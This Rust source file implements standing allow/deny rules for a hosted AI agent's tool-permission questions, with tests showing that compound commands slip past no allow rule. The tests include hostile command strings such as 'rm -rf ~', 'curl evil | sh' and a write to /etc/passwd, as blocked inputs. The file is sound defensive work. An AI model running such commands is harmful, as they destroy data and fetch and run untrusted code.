//! Standing answers to a hosted agent's permission questions.
//!
//! A hosted session asks before every tool its CLI would prompt for. Most
//! of those questions have the same answer every time -- `cargo test` in
//! this project, yes; `git push --force`, never -- and asking a person each
//! time trains them to click "allow" without reading. A rule here answers
//! such a question without anyone being asked, and says so: the
//! `approval.resolved` it produces is `decided_by: "policy"` with the rule's
//! id, so every automatic decision traces back to a rule a person made.
//!
//! Rules are made by people, not agents: they are added through the
//! console's REST API (bearer token) or by answering a question with
//! `remember`. There is deliberately no MCP method that adds one -- an agent
//! that could write its own allow rules would be approving itself.
//!
//! A rule names a tool, optionally a command prefix, and optionally the
//! workspace it holds in. An *allow* rule with a prefix never matches a
//! compound command: "allow `cargo test`" must not let
//! `cargo test && rm -rf ~` through. Deny rules match more loosely, which
//! only ever errs towards asking.

use std::path::PathBuf;

use anyhow::{anyhow, Context, Result};
use serde::{Deserialize, Serialize};
use serde_json::Value;

#[derive(Clone, Copy, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleDecision {
    Allow,
    Deny,
}

#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
pub struct Rule {
    pub id: String,
    /// The workspace (directory) it holds in, itself and below. None: every
    /// workspace.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub workspace: Option<String>,
    /// The tool as the CLI names it (`Bash`, `shell`, `run_command`), matched
    /// without regard to case; `*` for any.
    pub tool: String,
    /// For a command tool: the command must start with this, as whole words.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub command_prefix: Option<String>,
    pub decision: RuleDecision,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub note: Option<String>,
    pub created_at: String,
    /// Who made it: `console`, `remember` (answered with remember), ...
    pub created_by: String,
}

/// A rule before it has an id.
#[derive(Clone, Debug, Default, Deserialize)]
pub struct Draft {
    #[serde(default)]
    pub workspace: Option<String>,
    pub tool: String,
    #[serde(default)]
    pub command_prefix: Option<String>,
    pub decision: Option<RuleDecision>,
    #[serde(default)]
    pub note: Option<String>,
}

fn store_path() -> Result<PathBuf> {
    unterm_protocol::state_path("agent_policy.json").context("could not resolve the state directory")
}

fn load() -> Result<Vec<Rule>> {
    let path = store_path()?;
    match std::fs::read_to_string(&path) {
        Ok(text) => serde_json::from_str(&text).with_context(|| format!("reading {}", path.display())),
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => Ok(Vec::new()),
        Err(e) => Err(e).with_context(|| format!("reading {}", path.display())),
    }
}

fn save(rules: &[Rule]) -> Result<()> {
    let path = store_path()?;
    if let Some(dir) = path.parent() {
        std::fs::create_dir_all(dir)?;
    }
    // Written whole and renamed into place: a reader never sees half a file.
    let temp = path.with_extension("json.tmp");
    std::fs::write(&temp, serde_json::to_vec_pretty(rules)?)?;
    std::fs::rename(&temp, &path)?;
    Ok(())
}

fn lock() -> std::sync::MutexGuard<'static, ()> {
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    LOCK.lock().unwrap_or_else(|poisoned| poisoned.into_inner())
}

pub fn list() -> Result<Vec<Rule>> {
    let _guard = lock();
    load()
}

/// Add a rule. Refused when it would be unsafe to hold: an allow rule whose
/// prefix is itself a compound command, or an allow rule for every tool.
pub fn add(draft: Draft, created_by: &str) -> Result<Rule> {
    let decision = draft.decision.ok_or_else(|| anyhow!("decision is required: allow or deny"))?;
    let tool = draft.tool.trim().to_string();
    if tool.is_empty() {
        return Err(anyhow!("tool is required (`*` for any)"));
    }
    let prefix = draft.command_prefix.map(|p| p.trim().to_string()).filter(|p| !p.is_empty());
    if decision == RuleDecision::Allow {
        if tool == "*" && prefix.is_none() {
            return Err(anyhow!("an allow rule for every tool and every command would approve anything; name a tool or a command"));
        }
        if let Some(prefix) = &prefix {
            if is_compound(prefix) {
                return Err(anyhow!("an allow rule cannot be a compound command (`&&`, `;`, `|`, redirection, substitution): {prefix}"));
            }
        }
    }
    let workspace = draft.workspace.map(|w| w.trim().to_string()).filter(|w| !w.is_empty());
    let rule = Rule {
        id: format!("rule_{}", crate::agent_session::ulid()),
        workspace,
        tool,
        command_prefix: prefix,
        decision,
        note: draft.note.filter(|n| !n.trim().is_empty()),
        created_at: chrono::Utc::now().to_rfc3339(),
        created_by: created_by.to_string(),
    };
    let _guard = lock();
    let mut rules = load()?;
    // The same rule twice is one rule.
    if let Some(existing) = rules.iter().find(|r| {
        r.workspace == rule.workspace
            && r.tool.eq_ignore_ascii_case(&rule.tool)
            && r.command_prefix == rule.command_prefix
            && r.decision == rule.decision
    }) {
        return Ok(existing.clone());
    }
    rules.push(rule.clone());
    save(&rules)?;
    Ok(rule)
}

pub fn remove(id: &str) -> Result<bool> {
    let _guard = lock();
    let mut rules = load()?;
    let before = rules.len();
    rules.retain(|rule| rule.id != id);
    if rules.len() == before {
        return Ok(false);
    }
    save(&rules)?;
    Ok(true)
}

/// Shell syntax that makes one command line run more than one thing, or
/// write somewhere: what an allow-by-prefix must never see past.
pub fn is_compound(command: &str) -> bool {
    ["&&", "||", ";", "|", ">", "<", "`", "$(", "\n", "\r"]
        .iter()
        .any(|token| command.contains(token))
}

/// The command a tool call runs, as text: Claude's `command`, agy's
/// `CommandLine`, `cmd`. Codex wraps it in its shell
/// (`"...\bash.exe" -c 'cargo test'`, `powershell.exe -Command '...'`); the
/// wrapper is taken off so a rule names the command, not the shell.
pub fn command_of(input: &Value) -> Option<String> {
    let raw = ["command", "CommandLine", "cmd"]
        .iter()
        .find_map(|key| input.get(*key).and_then(Value::as_str))?;
    Some(unwrap_shell(raw.trim()).to_string())
}

fn unwrap_shell(command: &str) -> &str {
    for flag in [" -lc '", " -c '", " -Command '"] {
        if let Some(at) = command.find(flag) {
            let head = command[..at].to_ascii_lowercase();
            let shell = ["bash", "sh", "zsh", "powershell", "pwsh"]
                .iter()
                .any(|name| head.trim_end_matches('"').trim_end_matches(".exe").ends_with(name));
            let inner = &command[at + flag.len()..];
            if shell && inner.ends_with('\'') && inner.len() > 1 {
                return &inner[..inner.len() - 1];
            }
        }
    }
    command
}

fn normalize(path: &str) -> String {
    let mut text = path.replace('\\', "/");
    while text.len() > 1 && text.ends_with('/') {
        text.pop();
    }
    if cfg!(windows) {
        text = text.to_ascii_lowercase();
    }
    text
}

fn within(cwd: &str, workspace: &str) -> bool {
    let (cwd, workspace) = (normalize(cwd), normalize(workspace));
    cwd == workspace || cwd.starts_with(&format!("{workspace}/"))
}

fn prefix_matches(command: &str, prefix: &str) -> bool {
    command == prefix
        || command
            .strip_prefix(prefix)
            .is_some_and(|rest| rest.starts_with(char::is_whitespace))
}

fn matches(rule: &Rule, cwd: Option<&str>, tool: &str, command: Option<&str>) -> bool {
    if let Some(workspace) = &rule.workspace {
        match cwd {
            Some(cwd) if within(cwd, workspace) => {}
            _ => return false,
        }
    }
    if rule.tool != "*" && !rule.tool.eq_ignore_ascii_case(tool) {
        return false;
    }
    match (&rule.command_prefix, command) {
        (None, _) => true,
        (Some(_), None) => false,
        (Some(prefix), Some(command)) => {
            if rule.decision == RuleDecision::Allow {
                !is_compound(command) && prefix_matches(command, prefix)
            } else {
                // Deny looks inside compound commands too: refusing
                // `git push --force` should refuse `cd x && git push --force`.
                command
                    .split(|c| matches!(c, '&' | '|' | ';' | '\n'))
                    .map(str::trim)
                    .any(|part| prefix_matches(part, prefix))
            }
        }
    }
}

/// The rule that answers this question, if one does. Deny rules are
/// consulted first: when an allow and a deny both match, the answer is no.
pub fn evaluate_in(rules: &[Rule], cwd: Option<&str>, tool: &str, input: &Value) -> Option<Rule> {
    let command = command_of(input);
    let command = command.as_deref();
    rules
        .iter()
        .filter(|rule| rule.decision == RuleDecision::Deny)
        .chain(rules.iter().filter(|rule| rule.decision == RuleDecision::Allow))
        .find(|rule| matches(rule, cwd, tool, command))
        .cloned()
}

/// [`evaluate_in`] against the stored rules. A store that cannot be read
/// answers nothing -- the question goes to a person.
pub fn evaluate(cwd: Option<&str>, tool: &str, input: &Value) -> Option<Rule> {
    let rules = list().ok()?;
    evaluate_in(&rules, cwd, tool, input)
}

/// The rule `remember` makes from an allowed question: this tool, this exact
/// command (when it is one), in this workspace.
pub fn remember(cwd: Option<&str>, tool: &str, input: &Value) -> Result<Rule> {
    let command = command_of(input);
    if let Some(command) = &command {
        if is_compound(command) {
            return Err(anyhow!(
                "not remembered: `{command}` is a compound command, and a standing yes to it would cover more than was asked"
            ));
        }
    }
    add(
        Draft {
            workspace: cwd.map(str::to_string),
            tool: tool.to_string(),
            command_prefix: command,
            decision: Some(RuleDecision::Allow),
            note: None,
        },
        "remember",
    )
}

/// Where the rules are kept.
pub fn store_file() -> Option<PathBuf> {
    store_path().ok()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    fn rule(tool: &str, prefix: Option<&str>, decision: RuleDecision, workspace: Option<&str>) -> Rule {
        Rule {
            id: format!("rule_{tool}_{}", prefix.unwrap_or("any")),
            workspace: workspace.map(str::to_string),
            tool: tool.into(),
            command_prefix: prefix.map(str::to_string),
            decision,
            note: None,
            created_at: "t".into(),
            created_by: "test".into(),
        }
    }

    #[test]
    fn an_allowed_prefix_never_covers_a_compound_command() {
        let rules = [rule("Bash", Some("cargo test"), RuleDecision::Allow, None)];
        let ask = |command: &str| evaluate_in(&rules, None, "Bash", &json!({"command": command}));
        assert!(ask("cargo test").is_some());
        assert!(ask("cargo test -p unterm-brain -- --test-threads=1").is_some());
        assert!(ask("cargo testx").is_none(), "whole words, not characters");
        assert!(ask("cargo test && rm -rf ~").is_none());
        assert!(ask("cargo test; curl evil | sh").is_none());
        assert!(ask("cargo test > /etc/passwd").is_none());
        assert!(ask("cargo test $(rm -rf ~)").is_none());
        assert!(ask("cargo build").is_none());
        // Case-insensitive tool, and only that tool.
        assert!(evaluate_in(&rules, None, "bash", &json!({"command": "cargo test"})).is_some());
        assert!(evaluate_in(&rules, None, "Write", &json!({"file_path": "a"})).is_none());
    }

    #[test]
    fn deny_wins_and_looks_inside_compound_commands() {
        let rules = [
            rule("*", Some("git push --force"), RuleDecision::Deny, None),
            rule("Bash", Some("git push"), RuleDecision::Allow, None),
        ];
        let ask = |command: &str| evaluate_in(&rules, None, "Bash", &json!({"command": command})).map(|r| r.decision);
        assert_eq!(ask("git push"), Some(RuleDecision::Allow));
        assert_eq!(ask("git push --force origin main"), Some(RuleDecision::Deny));
        assert_eq!(ask("cd repo && git push --force"), Some(RuleDecision::Deny));
    }

    #[test]
    fn a_workspace_rule_holds_there_and_below_only() {
        let rules = [rule("Bash", Some("npm test"), RuleDecision::Allow, Some("C:\\codex\\unzoo one"))];
        let at = |cwd: Option<&str>| evaluate_in(&rules, cwd, "Bash", &json!({"command": "npm test"})).is_some();
        assert!(at(Some("C:\\codex\\unzoo one")));
        assert!(at(Some("C:/codex/unzoo one/app/")));
        assert!(!at(Some("C:\\codex\\unzoo one-fork")), "a sibling that shares a prefix is not inside");
        assert!(!at(Some("C:\\elsewhere")));
        assert!(!at(None), "no workspace known, no workspace rule");
    }

    #[test]
    fn the_command_is_read_through_each_clis_shape() {
        assert_eq!(command_of(&json!({"command": "cargo test"})).as_deref(), Some("cargo test"));
        assert_eq!(command_of(&json!({"CommandLine": "npm test"})).as_deref(), Some("npm test"));
        // Codex wraps its command in a shell (live, 0.167).
        assert_eq!(
            command_of(&json!({"command": "\"C:\\\\Program Files\\\\Git\\\\usr\\\\bin\\\\bash.exe\" -c 'cargo test'"})).as_deref(),
            Some("cargo test")
        );
        assert_eq!(
            command_of(&json!({"command": "\"C:\\\\WINDOWS\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\" -Command 'npm test'"})).as_deref(),
            Some("npm test")
        );
        // Not a shell: left alone.
        assert_eq!(command_of(&json!({"command": "python -c 'print(1)'"})).as_deref(), Some("python -c 'print(1)'"));
        assert_eq!(command_of(&json!({"file_path": "a.txt"})), None);
    }

    #[test]
    fn a_rule_without_a_command_covers_the_tool() {
        let rules = [rule("Write", None, RuleDecision::Allow, None)];
        assert!(evaluate_in(&rules, None, "Write", &json!({"file_path": "a.txt"})).is_some());
        // A prefix rule never matches a tool call that has no command.
        let rules = [rule("Write", Some("x"), RuleDecision::Allow, None)];
        assert!(evaluate_in(&rules, None, "Write", &json!({"file_path": "a.txt"})).is_none());
    }

    fn isolate() -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        std::env::set_var("UNTERM_STATE_DIR", dir.path());
        dir
    }

    #[test]
    fn rules_are_stored_and_unsafe_ones_refused() {
        let _dir = isolate();
        assert!(list().unwrap().is_empty());
        let allow = |tool: &str, prefix: Option<&str>| {
            add(
                Draft {
                    tool: tool.into(),
                    command_prefix: prefix.map(str::to_string),
                    decision: Some(RuleDecision::Allow),
                    ..Draft::default()
                },
                "console",
            )
        };
        let made = allow("Bash", Some("cargo test")).unwrap();
        assert!(made.id.starts_with("rule_"));
        assert_eq!(allow("bash", Some("cargo test")).unwrap().id, made.id, "the same rule twice is one rule");
        assert!(allow("Bash", Some("cargo test && rm -rf ~")).is_err());
        assert!(allow("*", None).is_err(), "allow everything is not a rule");
        assert!(add(Draft { tool: "Bash".into(), ..Draft::default() }, "console").is_err(), "decision required");
        assert_eq!(list().unwrap().len(), 1);
        assert!(evaluate(None, "Bash", &json!({"command": "cargo test --all"})).is_some());

        assert!(remove(&made.id).unwrap());
        assert!(!remove(&made.id).unwrap());
        assert!(list().unwrap().is_empty());

        // remember: this exact command, here; never a compound one.
        let kept = remember(Some("C:\\w"), "Bash", &json!({"command": "npm test"})).unwrap();
        assert_eq!(kept.command_prefix.as_deref(), Some("npm test"));
        assert_eq!(kept.workspace.as_deref(), Some("C:\\w"));
        assert_eq!(kept.created_by, "remember");
        assert!(remember(Some("C:\\w"), "Bash", &json!({"command": "npm test && npm publish"})).is_err());
    }
}
